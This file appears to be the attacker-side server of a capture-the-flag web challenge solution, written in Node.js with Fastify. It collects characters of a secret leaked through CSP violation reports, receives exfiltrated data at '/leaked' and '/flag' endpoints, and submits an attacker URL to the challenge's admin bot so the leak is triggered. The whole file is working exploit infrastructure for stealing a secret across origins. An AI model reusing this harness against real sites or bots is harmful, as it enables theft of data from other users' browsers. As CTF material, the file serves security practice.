const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.addContentTypeParser(
    "application/csp-report",
    { parseAs: "string" },
    fastify.getDefaultJsonParser()
  );

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  const reportedPrefixes = [];

  fastify.post("/csp-report", async (req, reply) => {
    const url = new URL(req.body["csp-report"]["document-uri"]);
    reportedPrefixes.push(url.searchParams.get("prefix"));
    return "";
  });

  fastify.get("/reported-prefixes", async (req, reply) => {
    const targetLen = parseInt(req.query.len);
    while (true) {
      if (reportedPrefixes.length >= targetLen) {
        reply.send(reportedPrefixes);
        reportedPrefixes.length = 0;
        return reply;
      }
      await sleep(10);
    }
  });

  fastify.post("/leaked", async (req, reply) => {
    // debug
    console.log(req.body);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(
      `${ATTACKER_BASE_URL}?${new URLSearchParams({
        baseUrl: "http://web:3000",
      })}`
    );

    fail("Failed");
  });
};
start();
